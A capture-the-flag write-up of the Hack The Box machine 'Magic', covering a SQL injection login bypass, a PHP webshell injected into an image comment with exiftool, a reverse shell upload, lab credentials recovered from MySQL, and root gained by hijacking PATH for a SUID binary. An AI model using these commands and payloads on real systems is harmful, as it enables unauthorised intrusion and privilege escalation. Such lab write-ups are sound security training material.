---
"title": "Hack The Box - Magic"
"date": 2020-08-22
"tags": ["linux", "medium", "file-upload-vuln", "sqli", "mysql", "path"]
"keywords": ["linux", "medium", "file-upload-vuln", "sqli", "mysql", "path"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Initial is by doing a SQLI to bypass login. And File Upload Vulnerability, from there we can get a shell and find user creds in SQL database. And root is by path hijack attack."
"featured_image": "/img/htb-magic/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-magic/Untitled.png)

Initial is by doing a SQLI to bypass login. And File Upload Vulnerability, from there we can get a shell and find user creds in SQL database. And root is by path hijack attack.

Link: [https://www.hackthebox.eu/home/machines/profile/241](https://www.hackthebox.eu/home/machines/profile/241)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
56044/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/23%OT=22%CT=56044%CU=37951%PV=Y%DS=2%DC=T%G=Y%TM=5EA
OS:15A54%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54
OS:DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

The webpage looks like a Photo Gallery and There is a login option in the left corner of the page.

![Untitled](/img/htb-magic/Untitled%201.png)

Let's Look at the login page. I tried some default credentials, didn't work. So next option is SQL Injection.

![Untitled](/img/htb-magic/Untitled%202.png)

Captured the login request in burp. And send that to the intruder.

![Untitled](/img/htb-magic/Untitled%203.png)

In payload tab added MySQL Authentication bypass from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). And Start Attack.

![Untitled](/img/htb-magic/Untitled%204.png)

We got some `302 Status`, they might help us login.

![Untitled](/img/htb-magic/Untitled%205.png)

![Untitled](/img/htb-magic/Untitled%206.png)

Logged in Successfully. And there is only an Image Upload options so I tried to upload a normal image first.

![Untitled](/img/htb-magic/Untitled%207.png)

Uploaded Successfully.

![Untitled](/img/htb-magic/Untitled%208.png)

I can see the image in the index page.

![Untitled](/img/htb-magic/Untitled%209.png)

I found the locations where these images are saving.

![Untitled](/img/htb-magic/Untitled%2010.png)

We can use Exiftool to inject payload into an image.

```bash
root@w0lf:~/CTF/HTB/Boxes/Magic# exiftool -Comment='<?php system($_GET['cmd']); ?>' payload.jpg
    1 image files updated
root@w0lf:~/CTF/HTB/Boxes/Magic# mv payload.jpg payload.php.jpg
```

Now We can upload the payload. 

![Untitled](/img/htb-magic/Untitled%2011.png)

![Untitled](/img/htb-magic/Untitled%2012.png)

## Getting shell as www-data

Our Payload is working. Let's try to get a reverse shell now.

![Untitled](/img/htb-magic/Untitled%2013.png)

Started python server in my machine and upload a PHP Reverse shell.

![Untitled](/img/htb-magic/Untitled%2014.png)

I used `wget` to upload the PHP reverse shell to the box.

![Untitled](/img/htb-magic/Untitled%2015.png)

Now I can access `wolfpayload.php` in the same directory and started my netcat listener. And We got `www-data` shell.

![Untitled](/img/htb-magic/Untitled%2016.png)

## Getting user Theseus

While enumerating I found `db.php5` in `/var/www/Magic` directory. We found some credentials, so `su` to the user.

![Untitled](/img/htb-magic/Untitled%2017.png)

Before doing `su`  we need to get a proper shell first.

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

 When tried login I get  Authentication Failure.

```bash
$ su theseus
su theseus
Password: iamkingtheseus

su: Authentication failure
```

Since we have MySql Credentials better Dump all. And I got one more password now.

![Untitled](/img/htb-magic/1.png)

Finally logged in as user with `theseus : Th3s3usW4sK1ng`

```bash
$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/var/www/Magic$ whoami
whoami
theseus
theseus@ubuntu:/var/www/Magic$
```

## Privilege Escalation

I uploaded my enumeration script and found a `SETUID` binary.

![Untitled](/img/htb-magic/Untitled%2018.png)

### What is sysinfo?

- sysinfo - return system information.

I did `strings` on `/bin/sysinfo` and it running some other tools too.

![Untitled](/img/htb-magic/Untitled%2019.png)

### What is lshw?

- lshw is used to generate the detailed information of the system’s hardware configuration

The path of `lshw` is not fully specified.

So we can create a file to give us shell and placed it in `/tmp` and name it as `lshw` and change the PATH to `/tmp`.

```bash
theseus@ubuntu:/tmp/test$ echo "reset; sh 1>&0 2>&0" > lshw
echo "reset; sh 1>&0 2>&0" > lshw
theseus@ubuntu:/tmp/test$ chmod 755 lshw
chmod 755 lshw
```

This command will make the PATH to search in `/tmp` first

```bash
theseus@ubuntu:/tmp/test$ export PATH=/tmp/test:$PATH
export PATH=/tmp/test:$PATH
```

Now by running `sysinfo` it will search for `lshw` to execute it and it asks the PATH where it locates and it will tell `lshw` is located in `/tmp/test/lshw`.

```bash
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
info.c	root.txt
#
```

We own the root!